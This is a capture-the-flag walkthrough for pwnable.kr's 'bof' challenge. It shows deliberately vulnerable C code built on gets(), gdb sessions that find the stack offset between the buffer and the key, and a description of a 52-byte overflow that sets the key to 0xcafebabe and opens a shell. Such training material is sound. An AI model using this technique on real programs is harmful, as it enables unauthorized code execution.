Another challenge from [pwnable.kr](http://pwnable.kr "pwnable.kr") will show us how to perform a simple buffer overflow attack.

{% highlight text %}
Nana told me that buffer overflow is one of the most common software vulnerability.
Is that true?
{% endhighlight %}

This time we're going to download the source code and the binary from the webpage. After that we're ready to analyze whatever this challenge brings to us.

{% highlight c %}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
{% endhighlight %}

Firstly, we can see that this application is vulnerable to overflow, since `gets()` function won't cut the characters after the buffer. Let's see man pages.

{% highlight text %}
Never use gets().  Because it is impossible to tell without knowing the
data  in  advance  how  many  characters  gets() will read, and because
gets() will continue to store characters past the end of the buffer, it
is  extremely  dangerous  to  use.   It has been used to break computer
security.  Use fgets() instead.
{% endhighlight %}

Since the best way to execute `/bin/sh` is to make the the comparision ***true***, we will have to overflow the buffer, and change the value of the `key` parameter. Game plan is to find out the address of the `key`, and then the address of
`overflowme`. This will allow us to calculate the offset between those 2 addresses, resulting in the number of trash data that has to be put into the buffer.

Let's fire up ***gdb***, and disassemble `main()` function.

{% highlight bash %}
w3ndige@main ~ % gdb ./bof

(gdb) disas main
Dump of assembler code for function main:
   0x0000068a <+0>:	push   %ebp
   0x0000068b <+1>:	mov    %esp,%ebp
   0x0000068d <+3>:	and    $0xfffffff0,%esp
   0x00000690 <+6>:	sub    $0x10,%esp
   0x00000693 <+9>:	movl   $0xdeadbeef,(%esp)
   0x0000069a <+16>:	call   0x62c <func>
   0x0000069f <+21>:	mov    $0x0,%eax
   0x000006a4 <+26>:	leave
   0x000006a5 <+27>:	ret
End of assembler dump.
{% endhighlight %}

Here we can see that at `main+9` the ***0xdeadbeef*** is moved into the ***esp***. In order to find the address of this variable we will have to set up breakpoint at `main+16`, and view the content of ***stack pointer***.

{% highlight bash %}
(gdb) break *main+16
Breakpoint 1 at 0x69a
(gdb) run
Starting program: /home/w3ndige/programming/pwnable.kr/bof

Breakpoint 1, 0x5655569a in main ()
(gdb) x/x $esp
0xffffd180:	0xdeadbeef
{% endhighlight %}

Great, we have it! Now we have to find the address of `overflowme` buffer, which lays in the `func` function. Let's disassemble it.

{% highlight bash %}
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   ebp
   0x0000062d <+1>:	mov    ebp,esp
   0x0000062f <+3>:	sub    esp,0x48
   0x00000632 <+6>:	mov    eax,gs:0x14
   0x00000638 <+12>:	mov    DWORD PTR [ebp-0xc],eax
   0x0000063b <+15>:	xor    eax,eax
   0x0000063d <+17>:	mov    DWORD PTR [esp],0x78c
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    eax,[ebp-0x2c]
   0x0000064c <+32>:	mov    DWORD PTR [esp],eax
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	mov    DWORD PTR [esp],0x79b
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	mov    DWORD PTR [esp],0x7a3
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0000067a <+78>:	xor    eax,DWORD PTR gs:0x14
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave
   0x00000689 <+93>:	ret
End of assembler dump.
{% endhighlight %}

Since we know that local variables are on the negative size of ***ebp*** ([read more](https://www.cs.virginia.edu/~evans/cs216/guides/x86.html "read more")), we can guess that `ebp-0x2c` is the address of `overflowme` variable. Let's set another breakpoint at `gets` and find out if it's true.

{% highlight bash %}
(gdb) break gets
Breakpoint 2 at 0xf7e3b915
(gdb) c
Continuing.
overflow me :

Breakpoint 2, 0xf7e3b915 in gets () from /usr/lib32/libc.so.6
(gdb) next
Single stepping until exit from function gets,
which has no line number information.
helloworld
0x56555654 in func ()
(gdb) x/1s $ebp -0x2c
0xffffd14c:	"helloworld"
{% endhighlight %}

Now we're ready to calculate the offset between those two addresses.

{% highlight python %}
>>> 0xffffd180 - 0xffffd14c
52
{% endhighlight %}

Ready to exploit?

By printing 52 ***A*** letters and the number used in comparision (stored in ***little endian format***), we were able to exploit this application.
